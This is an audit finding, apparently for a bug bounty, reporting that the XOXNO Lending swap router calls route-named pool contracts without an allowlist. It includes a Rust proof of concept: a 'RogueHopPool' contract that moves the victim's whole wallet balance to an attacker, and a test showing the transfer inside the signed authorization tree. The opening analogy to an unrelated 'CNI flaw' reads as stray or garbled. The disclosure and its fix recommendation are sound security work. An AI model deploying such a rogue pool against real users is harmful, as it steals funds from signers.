### Title
Attacker-named route pool executes arbitrary contract code beneath the caller's authorization, enabling wallet theft via poisoned auth tree - ([File: contracts/swap-aggregator/src/venues/phoenix.rs])

### Summary
The CNI flaw is a name-resolution bug: an attacker-controlled `type` field is resolved into a binary path, so `../`-style elements let the attacker load any executable on the system. The analog in XOXNO Lending is identical in shape: the swap route payload names the `pool` address that each hop invokes, and neither the router nor the controller keeps an allowlist of route venues or pools. A crafted route therefore causes arbitrary attacker-deployed contract code to run inside the controller's strategy call, directly beneath the caller's `require_auth` tree — where it can issue a `token.transfer(caller, attacker, amount)` for any token the caller holds, joining the caller's signed authorization as a child invocation.

### Finding Description
`phoenix::swap` invokes `ctx.hop.pool` — an address taken verbatim from the decoded route payload — with no allowlist [1](#0-0) . The Aquarius venue does the same [2](#0-1) . The threat model confirms the router "calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization," and that a token transfer that such code makes from the caller "executes if the caller signs that tree. The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [3](#0-2) . The controller's authority bound protects only its own grant — one exact input transfer to the configured router — and does not constrain what the route-named code does below it [4](#0-3) .

The test `rogue_hop_pool_transfer_joins_caller_auth_tree` demonstrates the primitive end-to-end: a `RogueHopPool` whose `swap` performs `token.transfer(victim, attacker, WALLET_BALANCE)` is named as the hop pool in a `swap_collateral` route; simulation records the theft as a child of Alice's `swap_collateral` auth entry, her entire wallet balance of an unrelated token moves to the attacker, and the swap still settles fairly so all protocol gates pass [5](#0-4) .

### Impact Explanation
Theft of user funds. Any token in the caller's wallet — not just the routed amount, not just protocol-listed assets — can be transferred to the attacker inside the same transaction, because the rogue hop executes under the caller's signed authorization tree. The loss is unbounded by the swap's `min_out`, the controller's measured-output check, or the final health-factor gate, all of which still pass. Reachable via `swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral`, and direct `execute_strategy`.

### Likelihood Explanation
Exploitation requires the victim to sign an authorization tree containing the rogue child invocation, which simulation faithfully records — so an attacker cannot steal purely on-chain; they must get a victim (or an integrating client/wallet that fails to inspect the recorded tree) to sign a poisoned route. The protocol's own defense is documented as a client-side duty: "A client must decode the route it signs and refuse an authorization tree with any other child." Because the contract itself imposes no venue allowlist and the vulnerability hinges on third-party signing behavior rather than privileged access, this is a real but conditioned exposure: Medium.

### Recommendation
Enforce a governance-managed allowlist of hop pool/venue addresses in the router's `dispatch_hop`/venue dispatch, rejecting routes that name unregistered pools — mirroring how Blend migration already requires an approved pool (INV-STRAT-03). Short of that, controller strategies could restrict route bytes to router-issued attestations, and wallets integrating XOXNO strategies must diff the simulated auth tree against the expected single-transfer shape and reject extra children.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` in the same repository executes the full attack: Alice supplies 10,000 USDC, holds an unrelated `wallet_token`, and calls `swap_collateral` with a route whose `hop_pool` is a deployed `RogueHopPool`. The pool's `swap` calls `token::Client::transfer(alice, attacker, WALLET_BALANCE)`; recording mode attaches that transfer as a sub-invocation of Alice's `swap_collateral` entry, the assertion `assert_eq!(s.wallet(&s.alice), 0)` confirms total wallet theft, and the swap still returns `FAIR_OUT_ETH` so every controller gate passes [6](#0-5) .

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
